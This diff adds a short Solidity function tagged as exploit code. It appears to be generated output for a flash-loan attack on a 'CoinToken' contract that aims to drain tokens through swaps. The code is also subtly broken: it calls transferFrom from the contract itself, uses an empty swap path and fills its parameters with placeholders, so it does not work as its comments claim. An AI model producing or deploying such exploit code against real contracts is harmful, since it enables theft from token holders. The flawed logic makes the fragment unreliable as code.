@@ -1,0 +1,20 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Utilize flash loaned valuableToken
+    IERC20(address(valuableToken)).transferFrom(address(this), target, amount);
+    
+    // Execute relevant functions of the target contract to gain more valuableToken
+    // Example: interacting with the CoinToken contract to perform swaps, mints, burns, etc.
+    ICoinToken(target).swapTokensForExactTokens(
+        // Parameters to swap 
+        1, // amountOut
+        amount, // amountInMax
+        new address[](2) // path
+    );
+    
+    // Ensure we have more valuableToken than we initially borrowed
+    require(valuableToken.balanceOf(address(this)) > amount, "Not enough valuableToken balance after exploit");
+}
+</executeExploitCode>
+```
